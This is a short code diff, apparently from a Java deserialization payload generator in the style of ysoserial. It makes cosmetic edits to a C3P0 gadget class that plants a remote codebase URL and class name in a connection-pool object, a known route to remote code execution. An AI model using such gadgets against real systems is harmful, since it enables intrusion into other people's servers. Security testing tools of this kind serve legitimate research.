@@ -14,6 +14,7 @@ import java.lang.reflect.InvocationTargetException;
 import java.net.URI;
 import java.util.Hashtable;
 
+@SuppressWarnings({"unused"})
 public class C3P0WrapperConnPool implements ObjectPayload<Object> {
     public static String makeC3P0UserOverridesString(String codebase, String clazz) throws ClassNotFoundException, NoSuchMethodException,
             InstantiationException, IllegalAccessException, InvocationTargetException, IOException {
@@ -33,7 +34,7 @@ public class C3P0WrapperConnPool implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
         URI uri = new URI(command);
-        String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
+        String[] args = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
         WrapperConnectionPoolDataSource obj = Reflections.createWithoutConstructor(WrapperConnectionPoolDataSource.class);
         Reflections.setFieldValue(obj, "userOverridesAsString", makeC3P0UserOverridesString(args[0], args[1]));
         return obj;
